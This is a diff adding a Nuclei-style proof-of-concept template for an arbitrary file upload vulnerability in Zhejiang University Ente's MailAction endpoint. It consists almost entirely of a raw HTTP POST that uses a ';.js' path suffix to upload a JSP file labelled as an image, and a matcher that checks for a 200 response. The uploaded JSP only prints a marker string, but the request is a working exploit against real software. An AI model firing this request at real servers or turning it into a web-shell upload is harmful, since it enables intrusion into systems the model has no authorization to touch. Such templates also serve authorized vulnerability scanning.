@@ -1,0 +1,68 @@
+id: poc-so4042ewl32icggg
+info:
+  name: 浙大恩特MailAction任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/so4042ewl32icggg'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: so4042ewl32icggg
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
+
+
+
+
+    ------WebKitFormBoundarye8FPHsIAq9JN8j2A
+
+
+    Content-Disposition: form-data; name="file";filename="dudesuite.jsp"
+
+
+    Content-Type: image/jpeg
+
+
+
+
+    <%out.print("dudesuite");%>
+
+
+    ------WebKitFormBoundarye8FPHsIAq9JN8j2A--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .jsp
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
